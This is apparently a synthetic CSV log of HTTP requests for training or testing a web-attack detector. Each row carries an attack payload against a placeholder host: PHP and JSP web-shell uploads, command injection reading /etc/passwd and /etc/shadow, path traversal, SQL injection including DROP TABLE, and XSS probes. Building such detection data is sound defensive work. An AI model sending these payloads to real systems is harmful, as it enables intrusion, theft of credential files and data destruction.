timestamp,client_ip,method,url,path,body,body_len,body_entropy,special_char_count,path_depth,query_length,has_file_upload,response_status,response_length
2025-01-01T10:00:00Z,offline,GET,http://test/cmd?q=cat /etc/passwd,/cmd,cat /etc/passwd,15,3.67,3,1,15,0,302,1361
2025-01-01T10:01:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,4.56,2,1,11,0,403,221
2025-01-01T10:02:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,3.6,19,1,55,1,302,1496
2025-01-01T10:03:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.91,22,1,85,1,500,418
2025-01-01T10:04:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,3.96,0,1,6,0,500,765
2025-01-01T10:05:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.62,0,1,6,0,200,287
2025-01-01T10:06:00Z,offline,GET,http://test/file?q=/etc/shadow,/file,/etc/shadow,11,6.46,2,1,11,0,302,1564
2025-01-01T10:07:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,4.06,7,1,11,0,403,695
2025-01-01T10:08:00Z,offline,GET,http://test/file?q=../../../../etc/passwd,/file,../../../../etc/passwd,22,4.6,13,1,22,0,302,406
2025-01-01T10:09:00Z,offline,POST,http://test/upload?q=filename=shell.php&content=<?php system($_GET['c']); ?>,/upload,filename=shell.php&content=<?php system($_GET['c']); ?>,55,4.03,19,1,55,1,200,701
2025-01-01T10:10:00Z,offline,GET,http://test/cmd?q=whoami,/cmd,whoami,6,4.85,0,1,6,0,200,295
2025-01-01T10:11:00Z,offline,GET,http://test/cmd?q=ping -c 4 127.0.0.1,/cmd,ping -c 4 127.0.0.1,19,6.32,7,1,19,0,500,1057
2025-01-01T10:12:00Z,offline,GET,http://test/search?q=1;DROP TABLE users,/search,1;DROP TABLE users,18,5.29,3,1,18,0,500,1044
2025-01-01T10:13:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,5.99,10,1,27,0,403,1532
2025-01-01T10:14:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.28,22,1,85,1,500,498
2025-01-01T10:15:00Z,offline,POST,"http://test/upload?q=filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",/upload,"filename=test.jsp&content=<% Runtime.getRuntime().exec(request.getParameter(""c"")); %>",85,4.11,22,1,85,1,302,773
2025-01-01T10:16:00Z,offline,GET,http://test/search?q=' OR '1'='1,/search,' OR '1'='1,11,3.96,7,1,11,0,302,1134
2025-01-01T10:17:00Z,offline,GET,http://test/file?q=..%2F..%2F..%2Fetc%2Fpasswd,/file,..%2F..%2F..%2Fetc%2Fpasswd,27,4.19,10,1,27,0,500,670
2025-01-01T10:18:00Z,offline,GET,http://test/xss?q=<svg onload=alert(1)>,/xss,<svg onload=alert(1)>,21,5.08,6,1,21,0,302,337
2025-01-01T10:19:00Z,offline,GET,http://test/xss?q=<body onload=alert(1)>,/xss,<body onload=alert(1)>,22,3.88,6,1,22,0,200,1048
2025-01-01T10:20:00Z,offline,GET,http://test/xss?q=<img src=x onerror=alert(1)>,/xss,<img src=x onerror=alert(1)>,28,4.94,8,1,28,0,302,514
